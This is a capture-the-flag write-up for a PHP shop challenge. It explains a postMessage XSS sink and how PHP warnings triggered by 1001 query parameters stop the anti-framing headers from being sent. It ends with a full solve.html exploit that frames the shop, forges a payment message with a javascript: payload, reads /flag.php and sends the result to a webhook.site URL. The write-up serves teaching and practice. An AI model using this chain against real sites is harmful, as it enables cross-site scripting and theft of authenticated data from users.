# Aura Farm

## Overview

As a start we have a shop where users can buy aura bundles. The challenge is split into three parts:

- the main shop application
- a separate payment application
- a bot that simulates a real user visiting our submitted URL

The shop does not handle the full payment flow by itself. When a user clicks **Buy now**, the shop opens the payment application. After the payment finishes, the payment page sends a `postMessage()` response back to the shop, and the shop redirects the user to the correct result page.

![AuraBuy shop](./public/writeups/aura-farm/images/01-shop.png)

The flag is exposed by `/flag.php`, but only the bot can read it because the bot authenticates first and receives the required cookie. That means our goal is not just to find a normal client-side bug. We need to get JavaScript execution in the main shop origin while the bot is visiting, then use that JavaScript to fetch `/flag.php` and send the response to our webhook.

## Finding The XSS Sink

We should start by looking at the main app, because the flag is on that origin. The interesting code is the message listener in `products.php`:

```js
window.addEventListener('message', (event) => {
  // if (event.origin !== paymentOrigin) {
  //   return;
  // }

  const data = event.data;
  if (!data || data.type !== 'payment') {
    return;
  }

  const redirectPath =
    typeof data.path === 'string' && data.path !== ''
      ? data.path
      : data.status === 'success'
        ? '/success/'
        : '/failure/';

  if (data.status !== 'success') {
    statusEl.textContent = 'Payment failed. Redirecting...';
    redirectTo(redirectPath);
    return;
  }

  statusEl.textContent = 'Payment confirmed. Redirecting...';
  redirectTo(redirectPath);
});
```

It contains a sink `redirectTo(redirectPath)`, which eventually calls:

```js
window.location.assign(path);
```

The `path` value comes directly from the `postMessage()` data. If we control that value, we can send a `javascript:` URL and make the shop execute JavaScript in its own origin.

Also the origin check is commented :

```js
// if (event.origin !== paymentOrigin) {
//   return;
// }
```

In a real application, an origin check should be present.But bugs still happen when the check uses weak validation, bad regex, or accepts attacker-controlled subdomains. I did not include that version in the challenge because it often forces players to buy a domain name.


So, in theory, we can host our own page, include the shop in an iframe, and send it a fake payment message:

```js
target.contentWindow.postMessage({
  type: 'payment',
  status: 'success',
  path: "javascript:alert(document.domain)"
}, '*');
```


## But The Direct Iframe Fails

The first idea is to iframe the shop and send the malicious payment response. That fails because the backend sends anti-framing headers:

```php
header('X-Frame-Options: DENY');
header("Content-Security-Policy: frame-ancestors 'none'");
```

When we try to load `/products.php` directly inside an iframe, the browser refuses to render it.


At this point we have a good XSS sink, but we cannot reach the target window through a normal iframe.

## Why Popups Do Not Help

The next idea is to use a popup or a new tab, because the original payment flo. The bot blocks this path intentionally.

In the bot source, `window.open` is replaced with a function that returns `null`:

```js
await context.addInitScript(() => {
  const blockedOpen = () => null;
  Object.defineProperty(window, 'open', {
    configurable: false,
    enumerable: true,
    writable: false,
    value: blockedOpen,
  });
});
```

The bot also closes any extra page that gets created:

```js
context.on('page', (popup) => {
  if (popup === page) {
    return;
  }
  void popup.close().catch(() => {});
});
```

So the obvious opener-based exploitation path is dead. We need to make the iframe approach work.

## Breaking The Headers With PHP Errors

The main app is written in PHP, and error display is enabled by default. That matters because of how HTTP responses work.

Headers must be sent before the body. If PHP writes output to the body first, it cannot go back and set new headers later. So if we can trigger an error before these lines finish:

```php
header('X-Frame-Options: DENY');
header("Content-Security-Policy: frame-ancestors 'none'");
```

then the anti-framing headers fail.

One simple way to do that is to send too many query parameters. PHP's default `max_input_vars` value is `1000`. If we send `1001` parameters, PHP prints this warning before the page content:

![PHP max_input_vars warning](./public/writeups/aura-farm/images/03-php-warning.png)

The important part is not only the first warning. PHP also prints:

```text
Cannot modify header information - headers already sent
```

That means the browser no longer receives the iframe-blocking headers. Now the shop can be framed.

We can build the bypass URL like this:

```js
const url = new URL('https://aura-farm.ctf.ingeniums.club/products.php');

for (let i = 1; i <= 1001; i++) {
  url.searchParams.set(`p${i}`, String(i));
}
```

## Final Exploit

After the header bypass, the chain is straightforward:

1. Host an attacker page.
2. Create an iframe pointing to `/products.php` with `1001` query parameters.
3. Wait for the iframe to load.
4. Send a forged `postMessage()` with `type: 'payment'`.
5. Put a `javascript:` payload in the `path` field.
6. The shop passes that path to `window.location.assign()`.
7. The payload runs in the shop origin.
8. The payload fetches `/flag.php` using the bot's authenticated cookie.
9. The payload sends the flag to our webhook.


## solve.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Aura Farm Solve</title>
</head>
<body>
  <iframe id="target" height="1000" width="500"></iframe>

  <script>
    const webhook = 'https://webhook.site/<id>';

    const target = document.getElementById('target');
    const url = new URL('https://aura-farm.ctf.ingeniums.club/products.php');

    for (let i = 1; i <= 1001; i++) {
      url.searchParams.set(`p${i}`, String(i));
    }

    target.src = url.toString();

    target.addEventListener('load', () => {
      target.contentWindow.postMessage({
        type: 'payment',
        status: 'success',
        path: `javascript:fetch('/flag.php')
          .then(r => r.text())
          .then(flag => fetch('${webhook}?flag=' + encodeURIComponent(flag)))`
      }, '*');
    });
  </script>
</body>
</html>
```

Submit the hosted `solve.html` URL to the bot. The bot visits it, the framed shop accepts the forged payment message, the `javascript:` redirect executes, and the webhook receives the flag.

## Flag

```text
ingehack{hTTP_S3cUr1tY_HE4D3rS_GO_bRRrrRrrRRrr}
```
